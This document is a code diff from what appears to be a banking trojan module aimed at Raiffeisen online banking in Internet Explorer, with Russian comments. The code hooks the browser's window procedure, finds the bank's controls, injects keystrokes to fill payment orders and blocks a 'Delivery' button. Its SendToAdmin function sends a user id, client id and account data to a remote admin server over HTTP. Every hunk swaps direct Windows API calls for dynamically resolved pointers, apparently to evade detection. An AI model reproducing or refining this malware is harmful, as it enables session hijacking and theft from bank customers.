@@ -447,7 +447,7 @@ static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPA
 								DBGRAFA( "Rafa", "Нажата кнопка Доставка" );
 								if( offBtDelivery )
 								{
-									MessageBox( 0, prophylaxisText, "Внимание!", MB_ICONWARNING );
+									pMessageBoxA( 0, prophylaxisText, "Внимание!", MB_ICONWARNING );
 									return 0;
 								}
 							}
@@ -1152,7 +1152,7 @@ static BOOL CALLBACK EnumTopWindows( HWND wnd, LPARAM lParam )
 		if( GetWndClassHash(wnd) == 0x6E5950C9 /* IEFrame */ ) //окно ИЕ в текущем процессе
 		{
 			IEWnd = wnd; //запоминаем окно ИЕ
-			EnumChildWindows( wnd, EnumTreeList, 0 ); //ищем в дочерних нужные нам контролы
+			pEnumChildWindows( wnd, EnumTreeList, 0 ); //ищем в дочерних нужные нам контролы
 			if( treeView && listView ) //нашли нужные контролы (дерево слева и таблицу справа сверху)
 			{
 				return FALSE; //останавливаем поиск
@@ -1478,7 +1478,7 @@ static bool SetText( const char* name, const char* s, ControlFinded* cf, int cou
 		{
 			while( *sendChars )
 			{
-				SendMessageA( ctrl->wnd, WM_CHAR, (WPARAM)*sendChars, (LPARAM)0 );
+				pSendMessageA( ctrl->wnd, WM_CHAR, (WPARAM)*sendChars, (LPARAM)0 );
 				sendChars++;
 			}
 		}
@@ -1618,7 +1618,7 @@ static void WorkInRafa()
 	c_findedBalans = 0;
 	HWND parent = (HWND)pGetParent(treeView);
 	//подменяем оконную процедуру главного окна, для перехвата нотификационных сообщений
-	MainWndProc = (WNDPROC)SetWindowLongPtr( parent, GWLP_WNDPROC, (LONG_PTR)HandlerMainWndProc );
+	MainWndProc = (WNDPROC)pSetWindowLongA( parent, GWLP_WNDPROC, (LONG_PTR)HandlerMainWndProc );
 	//проверяем, что была ли уже сделана платежка
 	bool was = false;
 	for(int i = 0; i < c_paymentOrders; i++ )
@@ -2184,7 +2184,7 @@ static char* SendToAdmin( const char* mode1, const char* mode2, bool ret )
 		//формируем запрос
 		GenerateUid(uid.str());
 		string azUser = GetAzUser();
-		wsprintfA( qr.str(), "http://%s/raf/?uid=%s&sys=raifur&cid=%s&mode=%s&%s", urlAdmin, uid, azUser.t_str(), mode, accs.str() );
+		pwsprintfA( qr.str(), "http://%s/raf/?uid=%s&sys=raifur&cid=%s&mode=%s&%s", urlAdmin, uid, azUser.t_str(), mode, accs.str() );
 		//отправляем запрос
 		THTTPResponseRec Response;
 		ClearStruct(Response);
